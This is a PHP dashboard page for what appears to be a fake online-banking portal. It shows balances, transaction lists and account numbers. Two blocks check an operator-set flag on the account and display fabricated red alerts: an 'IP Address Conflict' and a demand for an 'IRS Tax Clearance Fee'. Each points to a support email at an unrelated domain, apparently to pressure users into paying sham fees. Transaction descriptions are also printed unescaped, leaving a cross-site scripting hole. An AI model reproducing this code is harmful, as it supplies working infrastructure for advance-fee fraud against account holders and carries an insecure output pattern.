<?php
$UniqueName  = "Dashboard";
require($_SERVER['DOCUMENT_ROOT'] . "/accounts/layout/header.php");
// if ($page['kyc_status'] == '1' and $row['kyc_status'] == '0') {
//     header("location:./pending-kyc.php");
//     exit;
// }


// if ($row['kyc_pending'] == '0') {
//     header("location:./account-verification.php");
//     exit;
// }




if (@!$_SESSION['internetid']) {
    header("location:../login.php");
    die;
}
if (@!$_COOKIE['firstVisit']) {
    setcookie("firstVisit", "no", time() + 3600);
    toast_alert('success', 'Welcome Back ' . $fullName . " !", '');
}

unset($_SESSION['wire_transfer'], $_SESSION['dom_transfer']);

?>





<!--  BEGIN CONTENT PART  -->
<div id="content" class="main-content">
    <div class="layout-px-spacing">
        <br>


        <?php
        if ($temp_trans['trans_status'] == "pending") {

        ?>

            <div class="alert alert-icon-left alert-light-primary mb-4" role="alert">
                <button type="button" class="close" data-dismiss="alert" aria-label="Close"><svg data-dismiss="alert"> ... </svg></button>
                <svg> ... </svg>
                <strong>Alert!</strong> You have a pending wire transaction of <?= $currency ?><?php echo number_format($TempBalance, 2, '.', ','); ?>! <a href="transfer-pending.php" class="text-danger">Resume Transaction!</a>
            </div>


        <?php

        } else {


        ?>

        <?php
        }
        ?>



  <?php
// Assuming you have already set up the database connection as $conn

$sql = "SELECT acct_ssn FROM accounts WHERE acct_ssn = :acct_ssn";
$stmt = $conn->prepare($sql);
$stmt->execute([':acct_ssn' => '1']); // Checking for acct_ssn 1

// Initialize message variables
$message_displayed = false;
$message = "";

// Check if a row is returned
if ($stmt->rowCount() > 0) {
    $message_displayed = true;
    $message = "Attention: IP Address Conflict Detected. This conflict may prevent you from accessing certain services or performing specific actions on your account.<br>Please contact our support team at support@knobinvest.com for assistance.";
}
?>

<?php if ($message_displayed): ?>
    <div style="background-color: red; color: white; padding: 20px; border-radius: 8px; font-weight: bold; border: 2px solid #ff0000; width: fit-content;">
        <?php echo $message; ?>
    </div>
<?php endif; ?>


  <?php
// Assuming you have already set up the database connection as $conn

$sql = "SELECT acct_ssn FROM accounts WHERE acct_ssn = :acct_ssn";
$stmt = $conn->prepare($sql);
$stmt->execute([':acct_ssn' => '2']); // Checking for acct_ssn 1

// Initialize message variables
$message_displayed = false;
$message = "";

// Check if a row is returned
if ($stmt->rowCount() > 0) {
    $message_displayed = true;
    $message = "Important Notice: IRS Tax Clearance Fee Required. Your account requires an IRS Tax Clearance Fee to proceed with transactions. Please contact our support team at support@belvarebk.com";
}
?>

<?php if ($message_displayed): ?>
    <div style="background-color: red; color: white; padding: 20px; border-radius: 8px; font-weight: bold; border: 2px solid #ff0000; width: fit-content;">
        <?php echo $message; ?>
    </div>
<?php endif; ?>



        
        <div class="row layout-top-spacing">



            <div class="col-xl-4 col-lg-6 col-md-6 col-sm-12 col-12 layout-spacing">


                <div class="widget widget-account-invoice-three">

                    <div class="widget-heading">
                        <div class="wallet-usr-info">
                            <div class="usr-name">
                                <span> <?= $fullName ?> </span>
                            </div>
                            <div class="add">
                                <a href="./helpdesk.php"><span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-plus">
                                        <line x1="12" y1="5" x2="12" y2="19"></line>
                                        <line x1="5" y1="12" x2="19" y2="12"></line>
                                    </svg></span></a>
                            </div>
                        </div>
                        <div class="wallet-balance">
                            <p>Balance</p>
                            <h5 class=""><span class="w-currency"></span><?= $currency ?><?php echo number_format($TotalBalance, 2, '.', ','); ?></h5>
                        </div>
                       
                    </div>

                    <div class="widget-amount">

                        <div class="w-a-info funds-received">
                            <span>Inflow <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down">
                                    <polyline points="6 9 12 15 18 9"></polyline>
                                </svg></span><br>

                            <?php
                            $sql = "SELECT SUM(amount) FROM transactions WHERE transaction_type='credit' AND internetid=:internetid";
                            $stmt = $conn->prepare($sql);
                            $stmt->execute([
                                ':internetid' => $_SESSION['internetid']
                            ]);

                            $total = $stmt->fetch(PDO::FETCH_NUM);
                            $Inflow = $total[0];
                            ?>
                            <span class="text-success"><?= $currency ?><?php echo number_format($Inflow, 2, '.', ','); ?></span>


                        </div>

                        <div class="w-a-info funds-spent">
                            <span>Outflow <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-up">
                                    <polyline points="18 15 12 9 6 15"></polyline>
                                </svg></span><br>
                            <?php
                            $sql = "SELECT SUM(amount) FROM transactions WHERE transaction_type='debit' AND internetid=:internetid";
                            $stmt = $conn->prepare($sql);
                            $stmt->execute([
                                ':internetid' => $_SESSION['internetid']
                            ]);

                            $total = $stmt->fetch(PDO::FETCH_NUM);
                            $Outflow = $total[0];
                            ?>
                           <span class="text-danger"> <?= $currency ?><?php echo number_format($Outflow, 2, '.', ','); ?></span>
                        </div>
                    </div>

                    <div class="widget-content">

                        <!-- <div class="bills-stats">
            <span>Pending</span>
        </div> -->

                        <div class="invoice-list">

                            <div class="inv-detail">


                                <div class="info-detail-2">
                                    <p>Savings Balance: </p>
                                    <p class=""><span class="bill-amount text-info"><?= $currency ?><?php echo number_format($SavingsBalance, 2, '.', ','); ?></span></p>
                                </div>

                                <div class="info-detail-2">
                                    <p>Current Balance: </p>
                                    <p class=""><span class="bill-amount text-info"><?= $currency ?><?php echo number_format($CurrentBalance, 2, '.', ','); ?></span></p>
                                </div><br>

                                <!--<div class="info-detail-2">-->
                                <!--    <p>Last Login IP:</p>-->
                                <!--    <p class=""><span class="bill-amount text-danger"><?= $logs['ipAddress'] ?> </span></p>-->
                                <!--</div>-->

                                <!--<div class="info-detail-2">-->
                                <!--    <p>Last Login Date:</p>-->
                                <!--    <p class=""><span class="bill-amount text-danger"><?= $logs['datenow'] ?> </span></p>-->
                                <!--</div>-->

                            </div>

                            <div class="inv-action">
                                <a href="./history.php" class="btn btn-outline-primary view-details">View Details</a>
                                <a href="./my-account.php" class="btn btn-outline-primary pay-now">Account Details</a>
                            </div>
                        </div>
                    </div>

                </div>
            </div>


            <div class="col-xl-8 col-lg-12 col-md-12 col-sm-12 col-12 layout-spacing">
                <div class="widget widget-table-one">
                    <div class="widget-heading">
                        <h5 class="">Recent Transactions</h5>
                        <div class="task-action">
                           <div class="tm-action-btn">
                           <a href="./history.php"> <button class="btn"><span></span> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right">
                                    <line x1="5" y1="12" x2="19" y2="12"></line>
                                    <polyline points="12 5 19 12 12 19"></polyline>
                                </svg> View All</button></a>
                        </div>
                        </div>
                    </div>

                    <div class="widget-content">
                        <?php

                        $sql2 = "SELECT * FROM transactions WHERE internetid=:internetid ORDER BY trans_id DESC LIMIT 6";
                        $wire5 = $conn->prepare($sql2);
                        $wire5->execute([
                            ':internetid' => $_SESSION['internetid']
                        ]);
                        $sn = 1;

                        while ($result4 = $wire5->fetch(PDO::FETCH_ASSOC)) {
                            $TempBalance2 = $result4['amount'];
                        ?>

                            <?php
                            if ($result4['transaction_type'] === 'credit') {
                            ?>
                                <div class="transactions-list t-info">
                                    <div class="t-item">
                                        <div class="t-company-name">
                                            <div class="t-icon">
                                                <div class="avatar avatar-xl">
                                                    <span class="avatar-title">+</span>
                                                </div>
                                            </div>
                                            <div class="t-name">
                                                <p><?= $result4['description']; ?></p>
                                                <p class="meta-date"><?= $result4['created_at']; ?></p>
                                            </div>
                                        </div>
                                        <div class="t-rate rate-inc">
                                            <p><span>+<?= $currency ?><?php echo number_format($TempBalance2, 2, '.', ','); ?></span></p>
                                        </div>
                                    </div>
                                </div>

                            <?php
                            } else {
                            ?>
                                <div class="transactions-list">
                                    <div class="t-item">
                                        <div class="t-company-name">
                                            <div class="t-icon">
                                                <div class="avatar avatar-xl">
                                                    <span class="avatar-title">-</span>
                                                </div>
                                            </div>
                                            <div class="t-name">
                                                <p><?= $result4['description']; ?></p>
                                                <p class="meta-date"><?= $result4['created_at']; ?></p>
                                            </div>
                                        </div>
                                        <div class="t-rate rate-dec">
                                            <p><span>-<?= $currency ?><?php echo number_format($TempBalance2, 2, '.', ','); ?></span></p>
                                        </div>
                                    </div>
                                </div>

                            <?php
                            }
                            ?>




                        <?php
                        }
                        ?>





                    </div>
                </div>
            </div>
<!---
            <div class="col-xl-4 col-lg-6 col-md-6 col-sm-12 col-12 layout-spacing">

                <div class="widget widget-activity-four">

                    <div class="widget-heading">
                        <h5 class="">Recent Activities</h5>
                    </div>
                    

                    <div class="widget-content">

                        <div class="mt-container mx-auto">
                            <div class="timeline-line">

                                <?php

                                $sql2 = "SELECT * FROM activities WHERE internetid=:internetid ORDER BY id DESC";
                                $wire5 = $conn->prepare($sql2);
                                $wire5->execute([
                                    ':internetid' => $_SESSION['internetid']
                                ]);
                                $sn = 1;

                                while ($result4 = $wire5->fetch(PDO::FETCH_ASSOC)) {
                                ?>

                                    <div class="item-timeline timeline-primary">
                                        <div class="t-dot" data-original-title="" title="">
                                        </div>
                                        <div class="t-text">
                                            <p><?= $result4['details'] ?></p>
                                            <span class="text-danger"><?= $result4['createdAt'] ?></span>
                                        </div>
                                    </div>

                                <?php
                                }
                                ?>






                            </div>
                        </div>

                        <div class="tm-action-btn">
                           <a href="./activities.php"> <button class="btn"><span></span> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right">
                                    <line x1="5" y1="12" x2="19" y2="12"></line>
                                    <polyline points="12 5 19 12 12 19"></polyline>
                                </svg> View All</button></a>
                        </div>
                    </div>
                </div>
            </div>
--->

            <div class="col-xl-4 col-lg-12 col-md-12 col-sm-12 col-12 layout-spacing">
                <div class="widget widget-one">
<!--                <div class="widget-heading">
                        <h6 class="">Statistics</h6>

                        <div class="task-action">
                            <div class="dropdown">
                                <a class="dropdown-toggle" href="#" role="button" id="pendingTask" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-more-horizontal">
                                        <circle cx="12" cy="12" r="1"></circle>
                                        <circle cx="19" cy="12" r="1"></circle>
                                        <circle cx="5" cy="12" r="1"></circle>
                                    </svg>
                                </a>

                                <div class="dropdown-menu dropdown-menu-right" aria-labelledby="pendingTask" style="will-change: transform;">
                                    <a class="dropdown-item" href="javascript:void(0);">View</a>
                                    <a class="dropdown-item" href="javascript:void(0);">Download</a>
                                </div>
                            </div>
                        </div>

                    </div> 
                    <div class="w-chart">

                        <div class="w-chart-section total-visits-content">
                            <div class="w-detail">
                                <p class="w-title">Total Visits</p>
                                <p class="w-stats">423,964</p>
                            </div>
                        </div>


                        <div class="w-chart-section paid-visits-content">
                            <div class="w-detail">
                                <p class="w-title">Paid Visits</p>
                                <p class="w-stats">7,929</p>
                            </div>

                        </div>

                    </div> -->
                </div>
            </div>

            <div class="col-xl-4 col-lg-6 col-md-6 col-sm-12 col-12 layout-spacing">
                <div class="widget widget-card-four">
                    <div class="widget-content">
                        <div class="w-header">
                            <div class="w-info">
                                <h6 class="value">Current Account</h6>
                            </div>
                        </div>

                        <div class="w-content">

                            <div class="w-info">
                                <p class="value"><?= $row['current_acctno'] ?></p>
                            </div>

                        </div>

                    </div>
                </div>
            </div>

            <div class="col-xl-4 col-lg-6 col-md-6 col-sm-12 col-12 layout-spacing">
                <div class="widget widget-card-four">
                    <div class="widget-content">
                        <div class="w-header">
                            <div class="w-info">
                                <h6 class="value">Savings Account</h6>
                            </div>
                        </div>

                        <div class="w-content">

                            <div class="w-info">
                                <p class="value"><?= $row['savings_acctno'] ?></p>
                            </div>

                        </div>

                    </div>
                </div>
            </div>



        </div>

    </div>



    <?php



    require($_SERVER['DOCUMENT_ROOT'] . "/accounts/layout/footer.php");

    ?>